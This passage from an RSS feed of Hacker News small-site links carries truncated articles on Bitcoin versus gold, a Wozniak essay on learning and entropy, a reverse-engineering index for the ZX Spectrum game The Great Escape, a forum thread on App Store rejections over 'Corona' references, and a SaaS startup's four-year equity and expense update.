            <p><img data-src="https://images.squarespace-cdn.com/content/v1/5bdc8c06697a98bb346792b9/1609787168584-W5CUG5LTFARZNIN18MCP/ke17ZwdGBToddI8pDm48kL-2NPTcQbX2Z2XyS65Xm6pZw-zPPgdn4jUwVcJE1ZvWQUxwkmyExglNqGp0IvTJZUJFbgE-7XRK3dMEBRBhUpzoBNdQgC_bdDL4rNJe85oUyyI5W87-f3bcxJ-e5zlPUrdqbKDuWs2XsAzUHlLjjMo/image-asset.png" data-image="https://images.squarespace-cdn.com/content/v1/5bdc8c06697a98bb346792b9/1609787168584-W5CUG5LTFARZNIN18MCP/ke17ZwdGBToddI8pDm48kL-2NPTcQbX2Z2XyS65Xm6pZw-zPPgdn4jUwVcJE1ZvWQUxwkmyExglNqGp0IvTJZUJFbgE-7XRK3dMEBRBhUpzoBNdQgC_bdDL4rNJe85oUyyI5W87-f3bcxJ-e5zlPUrdqbKDuWs2XsAzUHlLjjMo/image-asset.png" data-image-dimensions="512x288" data-image-focal-point="0.5,0.5" alt="" src="https://images.squarespace-cdn.com/content/v1/5bdc8c06697a98bb346792b9/1609787168584-W5CUG5LTFARZNIN18MCP/ke17ZwdGBToddI8pDm48kL-2NPTcQbX2Z2XyS65Xm6pZw-zPPgdn4jUwVcJE1ZvWQUxwkmyExglNqGp0IvTJZUJFbgE-7XRK3dMEBRBhUpzoBNdQgC_bdDL4rNJe85oUyyI5W87-f3bcxJ-e5zlPUrdqbKDuWs2XsAzUHlLjjMo/image-asset.png"></p>
          
            </div>
          

        </div>

        
          
          <figcaption data-width-ratio="">
            <div>

              
                <div></div>
              

              
                <div><p>In this article, we will discuss how experts choose their cryptocurrency wallets and what types of wallets exist. </p></div>
              

              
                <div><div></div></div>
              

            </div>
          </figcaption>
        

      </figure>

    

  


</div></div><div data-block-type="2" id="block-yui_3_17_2_1_1609787077522_16537"><div><p>On the other hand, Bitcoin is far less difficult to transfer. One small hardware wallet can carry limitless amounts of value. What is more important is the costs of conducting a transfer. At the time of writing, transaction fees hover between $5 and $10.&nbsp;</p><p>In what world can you transfer $1M in gold for such low costs? Even if we were to, for some reason, physically transport the hardware wallet it would still cost lower and take less time to do so.&nbsp;</p><h2>Fungibility</h2><p><a href="https://www.investopedia.com/terms/f/fungibility.asp#:~:text=Fungibility%20is%20the%20ability%20of,equal%20value%20between%20the%20assets."><span>Fungibility</span></a> is an aspect that determines the ‘sameness’ of an asset. For example, two pounds of gold will have the same exact value as another set of two pounds of gold. This feature can be found in many other financial instruments, such as stocks, bonds, and even currencies.</p><p>The same can be said for Bitcoin. One BTC will always be equal to one BTC. The digital asset may be incredibly volatile in terms of value, but the coins themselves will always equal the same amount at a specific point in time.</p><p>For some in the industry, <a href="https://medium.com/@maitrehub/the-debate-on-the-fungibility-of-bitcoin-bbcd101581c9"><span>the fungibility of Bitcoin is debatable.</span></a> The entire argument pours down to the traceability of transactions on the Bitcoin network. This creates situations in which certain coins are deemed to be illegal and are therefore banned for selling by exchanges.&nbsp;</p><p>But given that decentralized exchanges and other operators do not flag certain coins, the problem remains theoretical. In fact, Bitcoin is even …</p></div></div></div></div></div></article></section></main></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://blog.shrimpy.io/blog/bitcoin-vs-gold">https://blog.shrimpy.io/blog/bitcoin-vs-gold</a></em></p>]]>
            </description>
            <link>https://blog.shrimpy.io/blog/bitcoin-vs-gold</link>
            <guid isPermaLink="false">hacker-news-small-sites-25770546</guid>
            <pubDate>Thu, 14 Jan 2021 01:25:31 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Pleasure of Learning]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25770521">thread link</a>) | @rajlego
<br/>
January 13, 2021 | https://supermemo.guru/wiki/Pleasure_of_learning | <a href="https://web.archive.org/web/*/https://supermemo.guru/wiki/Pleasure_of_learning">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="mw-content-text" lang="en" dir="ltr"><p><small>This text is part of: "<i><a href="https://supermemo.guru/wiki/Problem_of_Schooling" title="Problem of Schooling">I would never send my kids to school</a></i>" by <a href="https://supermemo.guru/wiki/Piotr_Wozniak" title="Piotr Wozniak">Piotr Wozniak</a> (2017)</small>
</p>

<h2><span id="The_main_problem_in_education">The main problem in education</span></h2>
<p>The main problem with regards to education is the belief that learning may cause displeasure, and that this displeasure should be <a href="https://supermemo.guru/wiki/The_grind_is_the_glory" title="The grind is the glory">endured</a> to achieve more learning.
</p><p>There are countless educators who believe that school should be like work: it is unpleasant but it just needs to be done. In this chapter, I will explain that the opposite is true: 
</p>
<p><b>Good learning is inherently pleasurable</b>, and without pleasure there is no good learning.</p>
<p>The displeasure myth is so prevalent that even good teachers with an extensive understanding of the pleasures of learning believe that a degree of unhappiness at school is unavoidable.
</p><p>In this chapter, I show that the pleasure of learning is wired into the brain, and how we systematically destroy this <a href="https://supermemo.guru/wiki/Education_counteracts_evolution" title="Education counteracts evolution">gift of evolution</a> at the cost of mankind's health, learning, creativity, and ultimately future.
</p><p>The main problem of education is also one of the main problems of society. By destroying the pleasure of learning we are contributing powerfully to the destruction of the pleasure of living. We have built an education system that sets millions of people up for a life of unhappiness.
</p><p>Chances are you are skeptical of my words, as the myth of unpleasant learning is a potent side effect of <a href="https://supermemo.guru/wiki/Schooling" title="Schooling">schooling</a>. Therefore this chapter is an attempt to convince you. And all that is necessary to abolish this myth is an understanding of the simple mechanism by which new knowledge is encoded in the brain. 
</p>
<h2><span id="Learn_drive_and_entropy">Learn drive and entropy</span></h2>
<p>The concept of entropy is helpful in understanding why most kids do not learn much at school.
</p><p>You may recall from your physics class that entropy is a measure of disorder, and that the second law of thermodynamics states that the entropy of an isolated system never decreases. This is the type of sexy law of physics that we tend to remember for life. It is <a href="https://supermemo.guru/wiki/Applicability" title="Applicability">universally applicable</a>.
</p><p>There is a sister concept in information theory called <a href="https://en.wikipedia.org/wiki/Entropy_(information_theory)">Shannon entropy</a>. It can be understood as the average value of information transmitted by a source. For example, take a channel that is continually transmitting a string of identical letters into infinity (e.g. a string of As: "AAAAAA..."). It is entirely predictable and carries an entropy of zero. We do not learn from such a channel.
</p><p><a href="https://en.wikipedia.org/wiki/Claude_Shannon">Claude Shannon</a> proposed the concept of information entropy in 1948. Soon after, scientists were hypothesizing as to whether the entropy of an information channel may have a powerful impact on how the brain perceives the value of the channel. In 1957, <a href="https://supermemo.guru/wiki/Music_and_entropy" title="Music and entropy">Meyer hypothesized</a> that the entropy of music determines the perception of its beauty. He concluded that a higher entropy may result in subjective tension, which correlates with more meaningful musical moments.
</p><p>Meyer's thinking was <a href="https://supermemo.guru/wiki/Impact_of_syncopation_on_the_pleasure_of_music" title="Impact of syncopation on the pleasure of music">later refined</a> to better understand the perception of music and information in general. There is more to music than just information. This is visible through the phenomena of a song being entertaining and fun for many playbacks. But this is rarely the case with books.
</p><p>Music is a universal message. If you were given a choice of a radio channel, you would quickly tune out from noisy static and you would also not be too excited about zero entropy silence. However, most people will respond positively to a regular beat of a drum. As long as it wasn't being drummed on broken glass, which we are wired to dislike, we would find a radio channel with a regular drumbeat more interesting than a silent one. This will naturally last only for a while until the drumbeat itself becomes boring and too predictable.
</p><p>Today, we can finally test the response of the brain to information entropy. Neuroimaging shows that the <a href="https://www.ncbi.nlm.nih.gov/pubmed/15896570">anterior hippocampus responds to the entropy of a visual stream</a>, and similar findings have been confirmed for the <a href="https://www.ncbi.nlm.nih.gov/pmc/articles/PMC3403290/">ventral striatum</a>. Therefore we are now certain that the brain responds to information entropy. The entropy sensor is important in scanning the environment for learning opportunities. This is the prelude to the reward that underlies the <a href="https://supermemo.guru/wiki/Learn_drive" title="Learn drive">learn drive</a>.
</p>
<h2><span id="Prior_knowledge_in_information_seeking">Prior knowledge in information seeking</span></h2>
<p>We need to distinguish between information and meaning. Entropy is not a good measure of the latter. The measure of meaning must involve the brain itself in addition to the information channel metric. Prior knowledge is essential in learning. Imagine that in your search for an interesting channel on the radio you find a news service. If the service is delivered in Thai and you do not speak Thai, you will prefer a service delivered in English. In information sense, news channels may have the same entropy, yet your prior knowledge will make you opt for the English channel. While the Thai channel delivers a stream of sounds, the English channel delivers a stream of <a href="https://supermemo.guru/wiki/Abstract_knowledge" title="Abstract knowledge">concepts</a>. Without understanding the knowledge of the recipient, information entropy tells us little. We cannot determine a signal-to-noise ratio.
</p><p>Every listener will have his or her own preferred level of information entropy. For most music lovers, the regular beat of a disco or techno will be somewhat more interesting than the isolated beat of a drum. This type of music carries a higher average level of information. For a more sophisticated listener a bit of syncopation will be welcome. However, syncopation requires a degree of prior learning. Those with lesser knowledge of music may get confused with increased rhythmic complexity. If there is too much information in the beat it <a href="https://supermemo.guru/wiki/Impact_of_syncopation_on_the_pleasure_of_music" title="Impact of syncopation on the pleasure of music">may no longer be possible to dance to the music</a>. To an average ear, the genius of Wynton Marsalis may be hard to perceive. Top shelf jazz music is reserved for only a small fraction of highly educated listeners, as for most of the population, as the complexity increases, the music slowly disintegrates into the direction of radio static.
</p>
<h2><span id="Entropy_detectors_in_the_brain">Entropy detectors in the brain</span></h2>
<p>The brain cannot effectively detect the entropy of the signal hitting the retina or the eardrum. Like pixels of a monitor, retinal cells are not aware of what they display. If the detector, such as the hippocampus, is to light up in response to entropy, it must operate on the inputs from the entorhinal cortex (i.e. the input to the hippocampus itself). Those inputs will present the signal after a high degree of processing. Instead of pixels, it may present a concept. A high entropy signal at the sensory inputs will lose most of its noise component early in the process of neural selection, completion, and <a href="https://supermemo.guru/wiki/Generalization" title="Generalization">generalization</a>. The signal-to-noise ratio will determine how much information is lost. The bigger the noise, the bigger the loss. The smarter we are, the more selective this processing will be and the more information will be lost at that stage. That's good. We become blind to detail. Pattern recognition will act like a deterministic function, which by definition, results in a drop in entropy. Complex patterns may become simple concepts. Those concepts will provide the actual input to the detector, e.g. the hippocampus.
</p><p>Note that the visual stream produced in experiments that prove the <a href="https://www.ncbi.nlm.nih.gov/pubmed/15896570">response of the hippocampus to signal entropy</a> has a highly <a href="https://supermemo.guru/wiki/Abstract_knowledge" title="Abstract knowledge">symbolic nature</a>. As such, the stream will lose far less information in processing. That highly simplified and <a href="https://supermemo.guru/wiki/Generalization" title="Generalization">conceptualized</a> message will be scanned for surprisal and provide guidance to the entire <a href="https://supermemo.guru/wiki/Learn_drive" title="Learn drive">learn drive</a> system. This is why, in this case, the hippocampus appears to be responding to input entropy.
</p><p>The above reasoning explains why both low and high entropy sensory signals can be uninteresting. After a degree of processing, a high entropy signal may lose all its noise and deliver a low entropy input to the hippocampus. We then observe the illusion of an "optimum entropy" level at sensory input. We need a new concept, <b><a href="https://supermemo.guru/wiki/Learntropy" title="Learntropy">learntropy</a></b>, that will help us accurately determine the attractiveness of the signal. Learntropy needs to take into account the high degree of processing of information before it can activate reward centers in the brain. Learntropy is discussed <a href="#Learntropy">later</a> in this text.
</p>
<h2><span id="Speed_of_information_processing">Speed of information processing</span></h2>
<p>An under-appreciated factor in sensory information scanning is the speed of information processing in the brain.
</p><p>For every piece of music, there is a tolerable playback range where the beauty of the music is appreciated. A high speed playback can be annoying and the music may become hard to decode, as the high speed goes beyond our processing power. The same piece of music slowed down can quickly lose its appeal. The same happens in speech delivery or in classroom lecturing. For the same information and the same entropy level, we may accomplish highly different levels of signal attractiveness. There is always an optimum speed of delivery and that speed depends on all other factors that power the <a href="https://supermemo.guru/wiki/Learn_drive" title="Learn drive">learn drive</a>, incl. prior knowledge. As such, speed of delivery is highly individual.
</p><p>I like to listen to lectures at 1.4x speed. I use 1.3x for more ambitious pieces. I never speed up <a href="https://en.wikipedia.org/wiki/Fareed_Zakaria_GPS">Fareed Zakaria</a> though, but rather relish every piece of information in this show. Students in a classroom lecture do not have a speed-up or slow-down button. Even the pause button, if available, is hard to hit as it may annoy other students.
</p><p>In schools, all too often, the speed of delivery surpasses student's processing capacity. This results in negligible learning and high stress. There is no time to <a href="https://supermemo.guru/wiki/Futility_of_schooling" title="Futility of schooling">enjoy the landscapes in the window of a high-speed train</a>. At MIT they call it <i>"drinking from a firehose"</i>.
</p>
<h2><span id="Probability_vs._knowledge">Probability vs. knowledge</span></h2>
<p>Low probability events carry more information. Average information determines entropy. Prior knowledge determines the perception of an information channel's entropy.
</p><p>If you happen to tune in to radio news and you hear that "<i>Janet Jackson has delivered a baby</i>", your degree of interest will depend on the probability of the event. If you have no idea who Janet Jackson is, this is a high probability event. If some <a href="http://www.theworldcounts.com/stories/How-Many-Babies-Are-Born-Each-Day">350,000 women deliver babies every single day</a>, this is no longer news and is not new or …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://supermemo.guru/wiki/Pleasure_of_learning">https://supermemo.guru/wiki/Pleasure_of_learning</a></em></p>]]>
            </description>
            <link>https://supermemo.guru/wiki/Pleasure_of_learning</link>
            <guid isPermaLink="false">hacker-news-small-sites-25770521</guid>
            <pubDate>Thu, 14 Jan 2021 01:23:06 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Reverse Engineering the Great Escape]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25770485">thread link</a>) | @stolen_biscuit
<br/>
January 13, 2021 | http://www.davespace.co.uk/the.great.escape/ | <a href="https://web.archive.org/web/*/http://www.davespace.co.uk/the.great.escape/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section>
    
<h2>Reverse Engineering The Great Escape</h2>

<p><dfn>The Great Escape</dfn> is a classic 1986 prison break game for the <a href="https://en.wikipedia.org/wiki/ZX_Spectrum">48K ZX Spectrum</a>. I've spent a considerable amount of time reverse engineering its routines and documenting its workings while simultaneously reimplementing it as portable C code. The following pages describe the process I went through.</p>

<p>This is an expanded-upon write-up of some of what I can dimly recall saying while presenting <a href="http://slides.com/dpt/the-great-escape/#/">these slides</a> to my team at INSIDE Secure (formerly Metaforic, now called <a href="https://www.verimatrix.com/">Verimatrix</a>) in Glasgow at a talk in January 2016.</p>

<img src="http://www.davespace.co.uk/the.great.escape/tge/diagram.png" width="544">

<ul>
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  <li><i></i> <a href="http://www.davespace.co.uk/the.great.escape/intro.html">Introduction</a> – Introducing "The Great Escape"</li>
  
  
  
  <li><i></i> <a href="http://www.davespace.co.uk/the.great.escape/reversing.html">Reverse Engineering</a> – Disassembling and rebuilding the classic 48K ZX Spectrum game from 1986</li>
  
  
  
  <li><i></i> <a href="http://www.davespace.co.uk/the.great.escape/discoveries.html">Discoveries</a> – Things I found out while pulling the game apart</li>
  
  
  
  <li><i></i> <a href="http://www.davespace.co.uk/the.great.escape/c.html">C Port</a> – Porting the game to C</li>
  
  
  
  <li><i></i> <a href="http://www.davespace.co.uk/the.great.escape/legals.html">Legals</a> – Abandonware?</li>
  
  
  
  <li><i></i> <a href="http://www.davespace.co.uk/the.great.escape/links.html">Links</a> – Project links</li>
  
  
</ul>

  </section></div>]]>
            </description>
            <link>http://www.davespace.co.uk/the.great.escape/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25770485</guid>
            <pubDate>Thu, 14 Jan 2021 01:18:08 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Apple rejects games using Corona Game Engine]]>
            </title>
            <description>
<![CDATA[
Score 5 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25770366">thread link</a>) | @serialx
<br/>
January 13, 2021 | https://forums.solar2d.com/t/rejected-on-appstore-contains-covid-19-or-related-references-in-the-plist-or-in-your-binary/351405 | <a href="https://web.archive.org/web/*/https://forums.solar2d.com/t/rejected-on-appstore-contains-covid-19-or-related-references-in-the-plist-or-in-your-binary/351405">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="main-outlet">
        

  


      <div itemscope="" itemtype="http://schema.org/DiscussionForumPosting">
        
        <div itemprop="articleBody">
          <p>Hi all need help, my app just a simple timer countdown app nothing related with covid-19. Did anyone know how to solve this issue? Thanks for your time</p>
<h3>Guideline 2.1 - Information Needed</h3>
<p>We have started the review of your app, but we are not able to continue because we need additional information about the functionality and services in your app related to the COVID-19 pandemic.</p>
<p><strong>Next Steps</strong></p>
<p>To help us proceed with the review of your app, please provide detailed responses to the following questions. The more information you can provide at this time, the sooner we can complete your review.</p>
<p>-Your app contains Covid-19 or related references in the .plist or in your binary, to what purpose does your app reference said subjects?<br>
-What are the steps needed to locate those references within your binary?</p>
<p>Once you reply to this message in Resolution Center with the requested information, we can proceed with your review.</p>
        </div>

        <meta itemprop="headline" content="Rejected on AppStore, contains Covid-19 or related references in the .plist or in your binary">
          <meta itemprop="keywords" content="">

        

         

      </div>
      <div itemscope="" itemtype="http://schema.org/DiscussionForumPosting">
        
        <div itemprop="articleBody">
          <p>Assuming you are using old builds. Download the latest build (2020.3582) and the issue should go away. <a href="https://developer.coronalabs.com/downloads/coronasdk" rel="nofollow noopener">https://developer.coronalabs.com/downloads/coronasdk</a></p>
<p>In the build settings add this splash control. It is free now.</p>
<pre><code>splashScreen =
    {
        ios = {
            enable = false
        },
        android = {
            enable = false
        }
    },</code></pre>
        </div>

        <meta itemprop="headline" content="Rejected on AppStore, contains Covid-19 or related references in the .plist or in your binary">

        

         

      </div>
      <div itemscope="" itemtype="http://schema.org/DiscussionForumPosting">
        
        <p>for your info I’m using latest build corona sdk 3582</p>

        <meta itemprop="headline" content="Rejected on AppStore, contains Covid-19 or related references in the .plist or in your binary">

        

         

      </div>
      <div itemscope="" itemtype="http://schema.org/DiscussionForumPosting">
        
        <p>Other developers faced this issue. As far as I know, they solved it by replying to that message and telling them about the engine and the transition to Solar2D. I remember <a href="https://forums.solar2d.com/u/grahamranson1">@GrahamRanson1</a> solving this. Maybe he could help.</p>

        <meta itemprop="headline" content="Rejected on AppStore, contains Covid-19 or related references in the .plist or in your binary">

        

         

      </div>
      <div itemscope="" itemtype="http://schema.org/DiscussionForumPosting">
        <div>
          
          <p><span itemprop="author" itemscope="" itemtype="http://schema.org/Person">
            <a itemprop="url" href="https://forums.solar2d.com/u/vlads"><span itemprop="name">vlads</span></a>
            
          </span></p>


          <p><span>
              <time itemprop="datePublished" datetime="2020-05-27T14:57:49Z">
                May 27, 2020,  2:57pm
              </time>
              <meta itemprop="dateModified" content="2020-05-27T14:57:49Z">
          <span itemprop="position">#5</span>
          </span>
        </p></div>
        <div itemprop="articleBody">
          <p>You can reply something like</p>
<blockquote>
<p>My game is using Corona Game Engine. It is 10 years in business of delivering games to Apple App Store. It is unrelated to COVID-19 or coronaviruses. It is also registered trademark of the Corona Labs.</p>
<p>Corona is a common word, which has meanings outside of the pandemic. Like <span>#3</span> game engine by games on mobile devices.</p>
</blockquote>
        </div>

        <meta itemprop="headline" content="Rejected on AppStore, contains Covid-19 or related references in the .plist or in your binary">

        

         

      </div>
      <div itemscope="" itemtype="http://schema.org/DiscussionForumPosting">
        
        <div itemprop="articleBody">
          <p>In case anybody still has problems with App Store rejection due to Corona references in the meta data, I just ran into that problem when submitting an update for Ice Trap that was rejected because:</p>
<blockquote>
<ul>
<li>Your app contains Corona references in the info_plist and other files in your binary, to what purpose does your app reference said subjects?</li>
<li>What are the steps needed to locate those references within your binary?</li>
</ul>
</blockquote>
<p>I replied the following and Apple was ok with it, and the update is now ready for sale:</p>
<blockquote>
<p>The reason for “Corona references” in the plist file is because the game itself is built using the Corona 2D game engine which has existed for probably at least 10 years. See <a href="https://coronalabs.com/" rel="nofollow noopener">https://coronalabs.com</a>.</p>
<p>Since the Corona pandemic started, a rebranding of the Corona game engine has taken place and it is now known as Solar2D, see <a href="https://solar2d.com/" rel="nofollow noopener">https://solar2d.com/</a>.</p>
<p>However, a lot of the internal libraries and plugins used by the engine still contain the Corona name and/or the <a href="http://coronalabs.com/" rel="nofollow noopener">coronalabs.com</a> domain name. This is nothing that is ever exposed to the end users and there are definitely no connections or references to the Covid-19 virus, just a very unfortunate name collision.</p>
<p>Hope you have understanding, as there is nothing I can do to change that.</p>
</blockquote>
        </div>

        <meta itemprop="headline" content="Rejected on AppStore, contains Covid-19 or related references in the .plist or in your binary">

        

         

      </div>
      <div itemscope="" itemtype="http://schema.org/DiscussionForumPosting">
        
        <p>I replied with something similar as above and it was approved in an hour.</p>

        <meta itemprop="headline" content="Rejected on AppStore, contains Covid-19 or related references in the .plist or in your binary">

        

         

      </div>
      <div itemscope="" itemtype="http://schema.org/DiscussionForumPosting">
        <div>
          
          <p><span itemprop="author" itemscope="" itemtype="http://schema.org/Person">
            <a itemprop="url" href="https://forums.solar2d.com/u/awara"><span itemprop="name">awara</span></a>
            
          </span></p>


          <p><span>
              <time itemprop="datePublished" datetime="2020-05-29T08:59:17Z">
                May 29, 2020,  8:59am
              </time>
              <meta itemprop="dateModified" content="2020-05-29T08:59:17Z">
          <span itemprop="position">#8</span>
          </span>
        </p></div>
        <p>Hi!, yesterday one update of an existing app was rejected, I replied with your message <a href="https://forums.solar2d.com/u/markus_ranner">@Markus_Ranner</a> and now I’m still waiting for review… <img src="https://forums.solar2d.com/images/emoji/apple/pensive.png?v=9" title=":pensive:" alt=":pensive:"></p>

        <meta itemprop="headline" content="Rejected on AppStore, contains Covid-19 or related references in the .plist or in your binary">

        

         

      </div>
      <div itemscope="" itemtype="http://schema.org/DiscussionForumPosting">
        <div>
          
          <p><span itemprop="author" itemscope="" itemtype="http://schema.org/Person">
            <a itemprop="url" href="https://forums.solar2d.com/u/awara"><span itemprop="name">awara</span></a>
            
          </span></p>


          <p><span>
              <time itemprop="datePublished" datetime="2020-06-08T13:02:45Z">
                June 8, 2020,  1:02pm
              </time>
              <meta itemprop="dateModified" content="2020-06-08T13:02:45Z">
          <span itemprop="position">#9</span>
          </span>
        </p></div>
        <p>Sorry for my delay, the app was approved a few hours later of my last message. Yesterday send a new app and was approved the same day!</p>

        <meta itemprop="headline" content="Rejected on AppStore, contains Covid-19 or related references in the .plist or in your binary">

        

         

      </div>






    </div></div>]]>
            </description>
            <link>https://forums.solar2d.com/t/rejected-on-appstore-contains-covid-19-or-related-references-in-the-plist-or-in-your-binary/351405</link>
            <guid isPermaLink="false">hacker-news-small-sites-25770366</guid>
            <pubDate>Thu, 14 Jan 2021 01:04:46 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Our SaaS Startup's Equity Allocation, Expenses, and Results After 4 Years]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25770221">thread link</a>) | @geoffroberts
<br/>
January 13, 2021 | https://www.outseta.com/posts/outseta-four-year-update | <a href="https://web.archive.org/web/*/https://www.outseta.com/posts/outseta-four-year-update">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="page" role="main">
        
          <article data-page-sections="5e5ab77cbd974c787316c1ca" id="sections">
  
    <section data-test="page-section" data-section-theme="" data-section-id="5e5ab77cbd974c787316c1cc" data-controller="SectionWrapperController, MagicPaddingController" data-current-styles="{
  &quot;imageOverlayOpacity&quot;: 0.15,
  &quot;video&quot;: {
    &quot;playbackSpeed&quot;: 0.5,
    &quot;filter&quot;: 1,
    &quot;filterStrength&quot;: 0,
    &quot;zoom&quot;: 0
  },
  &quot;backgroundWidth&quot;: &quot;background-width--full-bleed&quot;,
  &quot;sectionHeight&quot;: &quot;section-height--medium&quot;,
  &quot;customSectionHeight&quot;: 10,
  &quot;horizontalAlignment&quot;: &quot;horizontal-alignment--center&quot;,
  &quot;verticalAlignment&quot;: &quot;vertical-alignment--middle&quot;,
  &quot;contentWidth&quot;: &quot;content-width--wide&quot;,
  &quot;customContentWidth&quot;: 50,
  &quot;sectionTheme&quot;: &quot;&quot;,
  &quot;sectionAnimation&quot;: &quot;none&quot;,
  &quot;backgroundMode&quot;: &quot;image&quot;
}" data-animation="none">
  
  <div>
    <div>
      
      
      
      
      <div data-content-field="main-content" data-item-id="">
  <article id="article-">
  
    <div>
      

      <div>
        <div><div data-layout-label="Post Body" data-type="item" id="item-5ff4eb265291525b631908aa"><div><div><div data-block-type="2" id="block-42dc96a8d306e6899c68"><div><p>By <a href="https://www.linkedin.com/in/geoffrobertsmarketing/">Geoff Roberts</a> · 10 min read</p><p>Today is January 10, 2021—exactly four years since I published the first post on this blog, announcing to the world our intent to start building Outseta. It feels a bit crazy to be writing that and it also feels like we’re at a point of transition. </p><p>In many ways it feels like we’ve graduated—from being a pimply faced, early stage start-up teenager to a young company that’s blossoming into its potential. We’re undoubtedly more excited heading into 2021 than we’ve been at any point in our start-up journey so far.</p><p>This post serves as our four year update. Each of our previous updates, starting with our launch announcement, can be found below.</p><ul data-rte-list="default"><li><p><a href="https://www.outseta.com/posts/meet-our-new-software-start-up-outseta">Meet Our New Software Start-up, Outseta</a></p></li><li><p><a href="https://www.outseta.com/posts/outseta-two-year-update">Outseta Two Year Update</a></p></li><li><p><a href="https://www.outseta.com/posts/outseta-three-year-update">Outseta Three Year Update</a><br></p></li></ul><p>Let’s get right into the good stuff.</p><h2>Equity Allocation</h2><p>We’ve continued to use a very simple formula to distribute equity amongst our team—we all value our time at $100 per hour and anyone on our team can contribute cash to the company as well. At the end of each year we look at the total number of hours we’ve all worked plus the cash contributions we’ve each made and we use that to calculate how much equity we each hold in the business.</p><p>At the end of 2020 our equity allocation breaks down as:</p><ul data-rte-list="default"><li><p>Dimitris 36% </p></li><li><p>Dave 34% </p></li><li><p>Geoff 27%</p></li><li><p>James 3%</p></li></ul></div></div><div data-block-type="5" id="block-yui_3_17_2_1_1610145428502_5099"><div>








  

    
  
    <div data-test="image-block-inline-outer-wrapper">

      

      
        <figure>
          
        
        

        
          
            
          
        

        
          
          <figcaption>
            <p>Click the image to expand the table. Outseta equity allocation @ end of 2020.</p>
          </figcaption>
        
      
        </figure>
      

    </div>
  


  


</div></div><div data-block-type="2" id="block-yui_3_17_2_1_1610145428502_9440"><div><p>For the most part, we’ve continued to work primarily for sweat equity in the business so we can reinvest our revenue into the company. James, who works in a much more part-time capacity than the rest of us, has earned a mix of equity salary since he started working on Outseta. On September 1st of this year, I (Geoff) started drawing some salary from Outseta for the first time. We’d reached the point where we definitely needed more help and beginning to take some salary afforded me the opportunity to spend more time on Outseta and less time consulting. </p><p>It’s also worth noting the $1,572,200 number your see at the top of the 2020 column. Over four years this is really the cost of bringing a software product of Outseta’s scale to market. But as you’ll see as we get into our expenses, the vast majority of that figure would go towards salary that we haven’t taken.</p><h2>Expenses</h2><p>We’ve been really disciplined about keeping our expenses as low as possible since we started building Outseta. This goes back to our <a href="https://www.outseta.com/posts/outseta-saas-operating-agreement">operating agreement</a>, our desire to stay intentionally small, and our focus on profitability.</p></div></div><div data-block-type="5" id="block-yui_3_17_2_1_1610145428502_12917"><div>








  

    
  
    <div data-test="image-block-inline-outer-wrapper">

      

      
        <figure>
          
        
        

        
          
            
          
        

        
          
          <figcaption>
            <p>Outseta expenses by year 2017-2020. Click to expand.</p>
          </figcaption>
        
      
        </figure>
      

    </div>
  


  


</div></div><div data-block-type="2" id="block-yui_3_17_2_1_1610145428502_13209"><div><p>We’ve now spent a total of $123,335.23 on Outseta over the last four years. Our expenses have scaled up from about $8,000 in 2017 to about $57,000 in 2020. The primary driver of that increase was starting to draw some salary from Outseta this past year.</p><p>On the marketing front, we’ve focused almost exclusively on “free” marketing tactics to date—partnerships, content marketing, and email marketing. Our biggest lines items this past year were:</p><ul data-rte-list="default"><li><p>$2,500 to be a Gold Partner with Makerpad</p></li><li><p>$1,200 for a Pro subscription to Wistia</p></li></ul><p>The partnership with Makerpad was a critical step for us as we increased our focus on serving the no-code community. And while Wistia is a significant line item, we use video liberally for both marketing and customer support—and they’re a team I’m nothing but happy to support.</p><p>All things considered, I think our expenses are a strong data point that you can bootstrap an extremely ambitious software product into existence for a lot less money than you might think. While $123,000 isn’t a small amount of money by any means, that’s spending incurred over four years.</p><h2>Marketing Results</h2><p>One of my favorite aspects of being a marketing founder is that I’ve gotten to build every aspect of our customer acquisition process from the ground up. I’ve used this, quite purposely, to prove a point I’ve always advocated for—the metrics marketers are most often held accountable to are bullshit.</p><p>Website traffic? Vanity metric. Twitter followers? Nonsense. MQLs? There’s just no value in arbitrary lead quotas. None. They hurt more than they help.</p><p>All that matters in marketing is how many buyers actually show up with buying intent. That’s it. Jay Acunzo captures this approach beautifully:</p></div></div><div data-block-type="5" id="block-yui_3_17_2_1_1610211733556_13122"><div>








  

    
  
    <div data-test="image-block-inline-outer-wrapper">

      

      
        <figure>
          
        
        

        
          
            
